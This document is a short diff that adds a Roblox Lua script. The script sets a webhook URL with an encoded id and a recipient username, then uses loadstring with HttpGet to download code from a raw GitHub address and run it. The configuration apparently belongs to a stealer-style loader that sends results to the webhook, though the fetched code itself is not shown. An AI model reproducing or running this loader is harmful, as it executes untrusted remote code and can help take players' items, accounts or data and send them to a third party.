@@ -1,0 +1,4 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=eFQ5UVdnUGVsS2N2MjBoMGN1NUNwQTp2bV9aMGxRSlN5ZXlTWXBkNTVFV2E0MUJkd1RFcG5IV2w5ZktBTjZLZmlRdVFZblhzUHJieC1iZ3pUSFNSYTlwRk9HQlY5OTZ2Vks5MnJxNkFOMEtzcWtNcFhQUHp2cW5VdGd3TUVvUldfM2xhRmxydXpEd2gyc01KSFV2bmxDdFNQWllmRHRiVHpKWVAyLXdaV2MyMHhWang4VTFvUFBKaUlGcWY4R3lmNE0"
+Username = "im_kiddd8"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
